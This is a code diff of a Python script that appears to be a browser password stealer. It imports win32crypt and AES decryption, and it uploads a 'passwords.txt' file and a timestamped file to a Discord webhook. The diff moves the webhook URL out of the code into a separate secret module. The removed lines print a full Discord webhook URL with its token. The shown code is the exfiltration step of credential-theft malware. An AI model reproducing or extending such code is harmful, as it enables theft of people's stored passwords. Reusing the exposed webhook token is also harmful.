@@ -19,7 +19,11 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+import secret
+from secret import webhookurl
 # print("Started")
+
+wurl = webhookurl
 
 try:
     current_time = datetime.now()
@@ -453,7 +457,7 @@ try:
         # print('Failed to send the file. Status code:', response.status_code)
 
     # Replace 'WEBHOOK_URL' with your Discord webhook URL
-    webhook_url = 'https://discord.com/api/webhooks/1130818781808181248/LHQkasiDbFP2GY6TX7SHyIEndO5o8TJHv8y8hA_ss2I8jxYL9he9zwOoTpphfeICZ90l'
+    webhook_url = wurl
 
     # Replace 'FILE_PATH' with the path to the file you want to send
     file_path = f'./{formatted_time}.txt'
@@ -480,7 +484,7 @@ try:
         # print('Failed to send the file. Status code:', response.status_code)
 
     # Replace 'WEBHOOK_URL' with your Discord webhook URL
-    webhook_url = 'https://discord.com/api/webhooks/1130818781808181248/LHQkasiDbFP2GY6TX7SHyIEndO5o8TJHv8y8hA_ss2I8jxYL9he9zwOoTpphfeICZ90l'
+    webhook_url = wurl
 
     # Replace 'FILE_PATH' with the path to the file you want to send
     file_path2 = f'./passwords.txt'
